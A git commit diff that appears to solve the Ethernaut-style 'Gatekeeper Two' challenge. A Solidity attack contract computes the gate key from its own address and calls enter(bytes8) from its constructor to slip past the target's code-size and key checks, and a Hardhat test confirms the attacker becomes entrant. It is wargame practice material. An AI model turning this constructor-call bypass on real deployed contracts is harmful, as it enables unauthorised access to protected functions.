dbc7ca668295783f3a470e90380194e4d800ea45
Carlos Benjamin Alvarez Cruz <carlosalvarez098@gmail.com>
2022-02-18 20:50:55 -0600

    final

--- contracts/GatekeeperTwoAttack.sol
+++ contracts/GatekeeperTwoAttack.sol
@@ -1,11 +1,11 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.6.6;
 
 contract GatekeeperTwoAttack {
 
-    constructor(address _gatekeeper) {
+    constructor(address _gatekeeper) public {
 
-        uint64 arg = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1;
+        uint64 arg = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1;
         (bool success, ) = _gatekeeper.call(abi.encodeWithSignature('enter(bytes8)', bytes8(arg)));
         require(success);
     }
--- test/sample-test.js
+++ test/sample-test.js
@@ -2,6 +2,16 @@ const { expect } = require("chai");
 
 describe("Gatekeeper Two", function () {
   it("It should define entrant as the tx caller user1", async function () {
+    
+    const [deployer, hacker] = await ethers.getSigners();
 
+    const GatekeeperTwo = await ethers.getContractFactory('GatekeeperTwo');
+    const GatekeeperTwoAttack = await ethers.getContractFactory('GatekeeperTwoAttack', hacker);
+
+    this.gatekeeper = await GatekeeperTwo.deploy();
+    expect(await this.gatekeeper.entrant()).to.equal('0x0000000000000000000000000000000000000000');
+
+    this.gatekeeperAttack = await GatekeeperTwoAttack.deploy(this.gatekeeper.address);
+    expect(await this.gatekeeper.entrant()).to.equal(hacker.address);
   });
 });
